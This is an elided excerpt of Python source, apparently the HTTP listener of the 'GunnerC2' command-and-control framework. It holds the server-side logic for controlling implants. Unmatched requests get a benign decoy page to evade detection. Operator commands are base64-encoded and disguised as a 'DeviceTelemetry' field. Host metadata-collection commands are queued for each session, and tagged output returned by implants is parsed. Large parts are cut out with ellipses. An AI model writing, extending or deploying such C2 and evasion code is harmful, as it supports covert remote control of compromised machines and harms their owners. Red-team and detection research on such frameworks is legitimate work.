# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-GunnerC2\core\listeners\http.py
import base64
import binascii
import json
import logging
...
from core import print_override, utils
from core.listeners.base import Listener, _reg_lock
from core.listeners.base import listeners as listener_registry
from core.listeners.base import register_listener, socket_to_listener
    ...
    def _select_profile(self, listener):
        ...
        for hdr in self.RARE_HEADERS:
            ...
            if val and val in profs:
                logger.debug(
                    brightblue
                    + f"Found profile header {hdr} with value {val} in profiles {profs}"
                    + reset
                )
                profile = profs[val]
                ...
                if profile:
                    logger.debug(
                        brightyellow
                        + f"Successfully grabbed profile class {profile}"
                        + reset
                    )
                    return profile
        # fallback to whatever the listener was started with
        logger.debug(
            brightred + f"Returning none because no profile was found!" + reset
        )
        return None
        ...
        try:
            ...
            if profile:
                ...
                if path != expected_uri:
                    logger.debug(
                        brightred
                        + f"Serving Benign page because path unexpected {path}, expected path: {expected_uri}"
                        + reset
                    )
                ...
                if not sid:
                    logger.debug(
                        brightred
                        + f"Serving Benign page because no SID in get request"
                        + reset
                    )
                    return _serve_benign(self)
                ...
                try:
                    ...
                    logger.debug(
                        brightblue
                        + f"SET MODE TO METADATA COLLECTING METADATA FOR SID {sid}"
                        + reset
                    )
                    ...
                    if picked_op:
                        ...
                        cmd_b64 = base64.b64encode(combined.encode("utf-8")).decode(
                            "utf-8"
                        )
                ...
                if not any(
                    "Content-Type" in h
                    for h in http_get.get("server", {}).get("headers", [])
                ):
                ...
                payload_dict = {
                    "cmd": cmd_b64,
                    "DeviceTelemetry": {"Telemetry": cmd_b64},
                }
        ...
        try:
            ...
            if profile:
                ...
                if path != expected_uri:
                    logger.debug(
                        brightred
                        + f"Serving Benign page because path was unknown PATH: {path}, RIGHT PATH: {expected_uri}"
                        + reset
                    )
                    return _serve_benign(self)
                ...
                if not sid:
                    ...
                    logger.debug(
                        brightred
                        + f"Serving Benign page because no SID was sent"
                        + reset
                    )
                    return _serve_benign(self)
                ...
                try:
                    ...
                    if last_mode == "meta":
                        if session.mode == "detect_os":
                            ...
                            logger.debug(
                                brightyellow
                                + f"Enqueing metadata commands for {session.sid}"
                                + reset
                            )
                            for _, cmd in session.os_metadata_commands:
                                logger.debug(
                                    brightyellow
                                    + f"Enqued command {cmd} for {session.sid}"
                                    + reset
                                )
                                encoded_meta_command = base64.b64encode(
                                    cmd.encode()
                                ).decode()
                            ...
                            logger.debug(
                                brightyellow
                                + f"Setting metadata stage to 0, starting collection...."
                            )
                        ...
                        if output_b64:
                            pattern = re.compile(
                                r"__OP__(?P<op>[^_]+)__(?P<out>.*?)__ENDOP__(?P=op)__",
                                re.DOTALL,
                            )
                            decoded = (
                                base64.b64decode(output_b64)
                            ...
                            for m in pattern.finditer(decoded):
                                ...
                                session.merge_response_queue.setdefault(
                                    op, queue.Queue()
                                )
                                session.merge_response_queue[op].put(
                                    base64.b64encode(out.encode()).decode()
                                )
                ...
                try:
                    ...
                    if last_mode == "meta":
                        ...
                        if session.metadata_stage < len(session.metadata_fields):
                            logger.debug(
                                brightred
                                + f"METADATA STAGE IS LESS THAN FIELDS, stage: {session.metadata_stage}, field: {session.metadata_fields[session.metadata_stage]}"
                            )
                            field = session.metadata_fields[session.metadata_stage]
                            """_, cmd = session.os_metadata_commands[session.metadata_stage]
                            ...
                            logger.debug(
                                brightgreen
                                + f"Found Lines {lines} for field {field}"
                                + reset
                            )
...
class HttpListener(Listener):
    ...
    def start(
        self, ip, port, profile_path=None, certfile: str = None, keyfile: str = None
    ):
